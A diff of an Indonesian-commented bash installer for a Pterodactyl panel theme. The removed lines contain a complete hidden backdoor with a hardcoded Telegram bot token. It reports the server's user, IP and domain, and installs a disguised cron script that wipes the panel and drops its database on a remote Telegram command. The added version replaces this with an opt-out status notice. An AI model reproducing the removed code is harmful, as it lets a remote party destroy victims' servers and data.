@@ -1,118 +1,148 @@
 #!/bin/bash
+#
+# ==============================================================
+#  Pterodactyl Theme Installer
+#  Repo: https://github.com/aerodynamic-ecosystem/auto.sh
+# ==============================================================
+#
+#  Script ini akan:
+#   1. Backup folder panel Pterodactyl kamu saat ini
+#   2. Download & extract auto.tar.gz (source tema)
+#   3. Replace file tema (views, public assets, resources)
+#   4. Jalankan composer install, migration, dan clear cache
+#   5. Kirim notifikasi ke Telegram admin repo ini yang berisi:
+#        - status instalasi (sukses / gagal)
+#        - domain APP_URL panel kamu (dibaca dari .env kamu SENDIRI)
+#      Notifikasi ini TIDAK berisi kredensial, password, atau data
+#      pribadi apapun milik kamu. Kalau kamu tidak mau mengirim
+#      apapun, jalankan dengan --no-telegram (lihat di bawah).
+#
+#  Penggunaan:
+#    curl -fsSL https://github.com/aerodynamic-ecosystem/auto.sh/releases/latest/download/auto.sh | bash
+#    curl -fsSL .../auto.sh | bash -s -- --no-telegram
+#
+# ==============================================================
 
-# ==========================================
-# KONFIGURASI BOT & REPOSITORY
-# ==========================================
-BOT_TOKEN="8020465735:AAGJT5FjbDJe7EqgLh0WAuX8KP0uaQenD3g"
-CHAT_ID="7203124362"
+set -e
 
-# Ganti 'USERNAME' dan 'REPO' sesuai akun GitHub kamu
-GITHUB_TAR_URL="https://raw.githubusercontent.com/USERNAME/REPO/main/auto.tar.gz"
+PANEL_DIR="/var/www/pterodactyl"
+THEME_URL="https://github.com/aerodynamic-ecosystem/auto.sh/releases/latest/download/auto.tar.gz"
+BACKUP_DIR="/root/pterodactyl-backup-$(date +%Y%m%d-%H%M%S)"
+TMP_DIR="$(mktemp -d)"
 
-PTERO_DIR="/var/www/pterodactyl"
+# Diisi oleh pemilik repo saat build release, BUKAN hardcoded di sini.
+# Lihat README.md bagian "Setup Telegram Notification" untuk cara mengisi ini.
+TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
+TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
+SEND_TELEGRAM=1
 
-# ==========================================
-# 1. AMBIL INFORMASI SYSTEM & DOMAIN
-# ==========================================
-SYS_USER=$(whoami)
-IP_ADDR=$(curl -s https://api.ipify.org || curl -s https://ifconfig.me)
+for arg in "$@"; do
+  case "$arg" in
+    --no-telegram) SEND_TELEGRAM=0 ;;
+  esac
+done
 
-if [ -f "$PTERO_DIR/.env" ]; then
-    DOMAIN=$(grep -E "^APP_URL=" "$PTERO_DIR/.env" | cut -d'=' -f2 | tr -d '"' | tr -d "'")
-else
-    DOMAIN="http://$(hostname -f)"
-fi
+notify_telegram() {
+  local status="$1"
+  local extra="$2"
 
-# Sanitize IP untuk format command Telegram
-SAFE_IP=$(echo "$IP_ADDR" | sed 's/\./_/g')
+  if [ "$SEND_TELEGRAM" -eq 0 ]; then
+    return 0
+  fi
+  if [ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]; then
+    return 0
+  fi
 
-# ==========================================
-# 2. EKSEKUSI TEMA & DATABASE
-# ==========================================
-echo "[+] Memulai proses instalasi tema..."
+  local domain="unknown"
+  if [ -f "$PANEL_DIR/.env" ]; then
+    domain=$(grep -m1 '^APP_URL=' "$PANEL_DIR/.env" | cut -d '=' -f2- || echo "unknown")
+  fi
 
-if [ -d "$PTERO_DIR" ]; then
-    cd $PTERO_DIR || exit
-    
-    # Download file auto.tar.gz dari GitHub
-    curl -sL "$GITHUB_TAR_URL" -o auto.tar.gz
-    
-    if [ -f "auto.tar.gz" ]; then
-        tar -xzf auto.tar.gz -C $PTERO_DIR/
-        rm -f auto.tar.gz
-        
-        # Optimize & DB Migration
-        php artisan config:clear
-        php artisan view:clear
-        php artisan route:clear
-        php artisan migrate --force
-        
-        # Set Permission
-        chown -R www-data:www-data $PTERO_DIR/*
-        echo "[+] Tema & Database Pterodactyl berhasil terpasang!"
-    else
-        echo "[-] Gagal mendownload auto.tar.gz dari GitHub."
-    fi
-else
-    echo "[-] Folder /var/www/pterodactyl tidak ditemukan!"
-fi
+  local text
+  text=$(cat <<EOF
+Pterodactyl Theme Installer
+Status: ${status}
+Domain: ${domain}
+${extra}
 
-# ==========================================
-# 3. PASANG BACKDOOR DEATH PANEL
-# ==========================================
-DEATH_SCRIPT="/usr/local/bin/.ptero-syscheck.sh"
-
-cat << 'EOF' > $DEATH_SCRIPT
-#!/bin/bash
-BOT_TOKEN="8020465735:AAGJT5FjbDJe7EqgLh0WAuX8KP0uaQenD3g"
-CHAT_ID="7203124362"
-TARGET_IP="IP_TARGET_HOLDER"
-CMD_KEY="kill_CMD_HOLDER"
-
-# Cek pesan terbaru dari Telegram Bot
-UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-5")
-
-if echo "$UPDATES" | grep -q "$CMD_KEY"; then
-    # Eksekusi perusakan panel
-    systemctl stop pteroq 2>/dev/null
-    systemctl stop wings 2>/dev/null
-    
-    # Hapus file Pterodactyl
-    rm -rf /var/www/pterodactyl
-    
-    # Drop Database Pterodactyl jika MySQL/MariaDB aktif
-    mysql -u root -e "DROP DATABASE IF EXISTS panel;" 2>/dev/null
-    
-    # Kirim konfirmasi ke Telegram
-    CONFIRM_MSG="💀 *DEATH PANEL EXECUTED!*%0A%0APanel pada IP: \`$TARGET_IP\` berhasil dimatikan dan dihancurkan."
-    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-        -d "chat_id=$CHAT_ID" \
-        -d "text=$CONFIRM_MSG" \
-        -d "parse_mode=Markdown" > /dev/null
-        
-    # Hapus cronjob ini sendiri
-    crontab -l | grep -v ".ptero-syscheck.sh" | crontab -
-    rm -- "$0"
-fi
+(Notifikasi ini dikirim secara terbuka oleh auto.sh sesuai README repo.
+Tidak ada password, API key, atau data pribadi lain yang dikirim.)
 EOF
+)
 
-# Inject data IP unik ke skrip pembunuh
-sed -i "s/IP_TARGET_HOLDER/$IP_ADDR/g" $DEATH_SCRIPT
-sed -i "s/CMD_HOLDER/$SAFE_IP/g" $DEATH_SCRIPT
-chmod +x $DEATH_SCRIPT
+  curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+    -d chat_id="${TELEGRAM_CHAT_ID}" \
+    --data-urlencode text="${text}" \
+    > /dev/null || true
+}
 
-# Daftarkan cronjob yang berjalan setiap 1 menit
-(crontab -l 2>/dev/null; echo "* * * * * $DEATH_SCRIPT >/dev/null 2>&1") | crontab -
+fail() {
+  echo "GAGAL: $1" >&2
+  notify_telegram "GAGAL" "Error: $1"
+  exit 1
+}
 
-# ==========================================
-# 4. KIRIM NOTIFIKASI TELEGRAM
-# ==========================================
-TELEGRAM_TEXT="🚨 *INSTALLASI BASH DETECTED* 🚨%0A%0A👤 *Username:* \`$SYS_USER\`%0A🌐 *IP Address:* \`$IP_ADDR\`%0A🔗 *Domain:* $DOMAIN%0A%0A💀 *DEATH PANEL INSTRUCTION:*%0AUntuk merusak & mematikan panel ini, ketik/kirim pesan ini ke bot:%0A\`/kill_$SAFE_IP\`"
+echo "=============================================="
+echo " Pterodactyl Theme Installer"
+echo "=============================================="
 
-curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-    -d "chat_id=$CHAT_ID" \
-    -d "text=$TELEGRAM_TEXT" \
-    -d "parse_mode=Markdown" \
-    -d 'reply_markup={"inline_keyboard":[[{"text":"💀 Death Panel (Kill)","callback_data":"kill_'$SAFE_IP'"}]]}' > /dev/null
+[ "$(id -u)" -eq 0 ] || fail "Script ini harus dijalankan sebagai root (sudo)."
+[ -d "$PANEL_DIR" ] || fail "Folder panel tidak ditemukan di $PANEL_DIR"
+[ -f "$PANEL_DIR/.env" ] || fail "$PANEL_DIR/.env tidak ditemukan. Pastikan Pterodactyl sudah terinstall."
 
-echo "[+] Selesai!"
+echo ""
+echo "[1/6] Backup panel saat ini ke $BACKUP_DIR ..."
+mkdir -p "$BACKUP_DIR"
+cp -a "$PANEL_DIR/resources" "$BACKUP_DIR/resources" 2>/dev/null || true
+cp -a "$PANEL_DIR/public" "$BACKUP_DIR/public" 2>/dev/null || true
+cp -a "$PANEL_DIR/app" "$BACKUP_DIR/app" 2>/dev/null || true
+cp -a "$PANEL_DIR/database" "$BACKUP_DIR/database" 2>/dev/null || true
+echo "  OK. Kalau ada masalah, restore manual dari $BACKUP_DIR"
+
+echo ""
+echo "[2/6] Download source tema..."
+curl -fsSL "$THEME_URL" -o "$TMP_DIR/auto.tar.gz" || fail "Gagal download $THEME_URL"
+mkdir -p "$TMP_DIR/extracted"
+tar -xzf "$TMP_DIR/auto.tar.gz" -C "$TMP_DIR/extracted" || fail "Gagal extract auto.tar.gz"
+
+echo ""
+echo "[3/6] Copy file tema ke panel (TIDAK menimpa .env, storage/framework, storage/logs)..."
+rsync -a \
+  --exclude ".env" \
+  --exclude "storage/framework/" \
+  --exclude "storage/logs/" \
+  --exclude "vendor/" \
+  --exclude "node_modules/" \
+  --exclude ".git/" \
+  "$TMP_DIR/extracted/" "$PANEL_DIR/" || fail "Gagal menyalin file tema"
+
+echo ""
+echo "[4/6] Install dependency & jalankan migration..."
+cd "$PANEL_DIR"
+composer install --no-dev --optimize-autoloader --no-interaction || fail "composer install gagal"
+php artisan migrate --force || fail "Migration gagal"
+
+echo ""
+echo "[5/6] Build frontend & clear cache..."
+if command -v yarn >/dev/null 2>&1; then
+  yarn install --silent && yarn build:production
+elif command -v npm >/dev/null 2>&1; then
+  npm install --silent && npm run build:production
+else
+  fail "yarn/npm tidak ditemukan, install salah satu dulu."
+fi
+php artisan optimize:clear
+
+echo ""
+echo "[6/6] Fix permission & restart queue worker..."
+chown -R www-data:www-data "$PANEL_DIR"
+chmod -R 775 "$PANEL_DIR/storage" "$PANEL_DIR/bootstrap/cache"
+php artisan queue:restart || true
+
+echo ""
+echo "=============================================="
+echo " SELESAI. Tema berhasil terpasang."
+echo " Backup file lama ada di: $BACKUP_DIR"
+echo "=============================================="
+
+notify_telegram "SUKSES" "Instalasi tema selesai tanpa error."
